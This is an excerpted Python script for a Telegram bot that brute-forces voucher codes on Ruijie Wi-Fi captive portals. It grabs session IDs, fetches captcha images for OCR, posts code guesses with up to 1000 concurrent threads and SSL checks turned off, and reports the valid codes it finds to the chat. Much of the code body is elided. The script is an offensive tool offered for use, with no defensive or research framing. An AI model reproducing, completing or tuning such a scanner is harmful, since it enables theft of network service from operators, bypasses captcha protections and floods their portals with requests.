...
# -*- coding: utf-8 -*-
# ==============================================
#  Ruijie Voucher Scanner Bot  —  v12.0 (MAX SPEED)
#  ULTRA HIGH PERFORMANCE - MAX CONCURRENCY
...
# === MAX SPEED CONFIG ===
THREADS = 1000                  # Max concurrent checks
BATCH_SIZE = 3000               # Codes per batch
CONNECTION_LIMIT = 10000        # Max connections
CONNECTION_PER_HOST = 5000      # Per host
TIMEOUT = 8                     # Request timeout
CAPTCHA_RETRIES = 2             # Captcha retry attempts
# =============================================
...
async def get_session_id(sess, session_url, previous=None):
    ...
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False, timeout=3) as r:
...
async def Captcha_Image(sess, session_id):
    ...
    try:
        async with sess.get(
            ...
            headers=headers, ssl=False, timeout=3
        ) as r:
            return await r.read()
    except:
        return None
    ...
    for attempt in range(2):
        try:
            async with aiohttp.ClientSession(
                ...
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False, timeout=6) as r:
...
async def run_scan(chat_id, session_url, start_code, end_code, workers, mode="range"):
    ...
    summary = (
        ...
        f"⚡ Avg Speed: {stats['tried']/elapsed:.1f} c/s"
    )
    if hit_list:
        summary += "\n\n📋 <b>Found Codes:</b>\n" + "\n".join(hit_list[:20])
    try:
...
async def cmd_seturl(message):
    ...
    await bot.reply_to(
        ...
        f"<code>{url[:60]}...</code>\n\n"
        "ယခု /scan 6  သို့ /scan 7  သို့ /scan 8  နဲ့ scan စတင်ပါ။",
        parse_mode="HTML"
    )
...
async def cmd_scan(message):
    ...
    progress_msg = await bot.send_message(
        chat_id,
        f"⚡ <b>MAX SPEED Scanner Running</b> ⚡\n\n"
        f"🎯 Mode: {label}\n"
        f"🚀 Threads: {THREADS}\n"
        f"📦 Batch: {BATCH_SIZE}\n"
        "🔍 Tried: 0\n"
...
async def main():
    ...
    print("=" * 60)
    print("🚀 Ruijie Scanner Bot v12.0 - MAX SPEED")
    print("=" * 60)
    ...
    print(f"✅ OCR: {'✅ Available' if _HAS_OCR else '❌ Not installed'}")
    print("=" * 60)
    print("📱 Bot is running... Type /start in Telegram")
